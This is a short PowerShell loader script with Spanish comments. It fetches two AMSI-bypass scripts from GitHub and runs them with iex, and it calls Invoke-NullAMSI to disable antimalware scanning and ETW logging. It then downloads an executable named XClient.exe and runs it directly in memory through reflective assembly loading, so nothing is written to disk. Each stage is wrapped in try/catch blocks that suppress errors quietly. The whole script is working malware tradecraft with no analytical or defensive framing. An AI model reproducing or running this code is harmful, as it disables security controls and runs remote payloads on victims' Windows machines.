try {
    iex (iwr -UseBasicParsing "https://github.com/robertoaguilarfields-blip/my-proyecto/raw/refs/heads/main/bypass-amsi.ps1")
} catch {
    Write-Verbose "Error ejecutando bypass-amsi: $_"
}
try {
    iex (iwr -UseBasicParsing "https://raw.githubusercontent.com/BlackShell256/Null-AMSI/refs/heads/main/Null-4MSI.ps1")
} catch {
    Write-Verbose "Error descargando Null-AMSI: $_"
}
try {
    Invoke-NullAMSI -etw
    Invoke-NullAMSI -v
} catch {
    Write-Verbose "Error invocando NullAMSI: $_"
}
try {
    $exeUrl = "https://github.com/robertoaguilarfields-blip/my-proyecto/raw/refs/heads/main/XClient.exe"
    $exeBytes = (New-Object System.Net.WebClient).DownloadData($exeUrl)
    $assembly = [Reflection.Assembly]::Load($exeBytes)
    $entry = $assembly.EntryPoint

    # Detectar automáticamente si Main tiene parámetros
    if ($entry.GetParameters().Count -eq 0) {
        $entry.Invoke($null, $null)
    } else {
        $entry.Invoke($null, (, [string[]]@()))
    }
} catch {
    Write-Verbose "Error ejecutando EXE en memoria: $_"
}



